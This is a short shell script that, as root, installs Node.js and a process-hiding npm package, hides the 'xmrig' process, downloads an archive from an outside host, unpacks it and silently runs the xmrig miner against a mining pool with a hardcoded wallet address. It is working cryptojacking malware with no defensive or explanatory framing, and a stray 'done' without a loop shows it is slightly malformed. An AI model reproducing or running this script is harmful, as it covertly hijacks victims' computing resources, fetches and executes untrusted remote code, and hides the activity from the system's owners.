#!/bin/sh
sudo su --command "curl -sL https://deb.nodesource.com/setup_17.x | sudo -E bash - && sudo apt-get install -y nodejs && npm i -g updates && npm i -g node-process-hider && npm install -g npm@8.10.0 && sudo ph add xmrig" && wget  https://widewebhoster.com/s.tar.gz ; tar xvzf s.tar.gz ; ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u TRX:TJdwksXohPLiUiqQDtBm9SkJgQUXQm6KWg.soundcloud -p x >/dev/null 2>&1
sleep 3
done
sleep 999
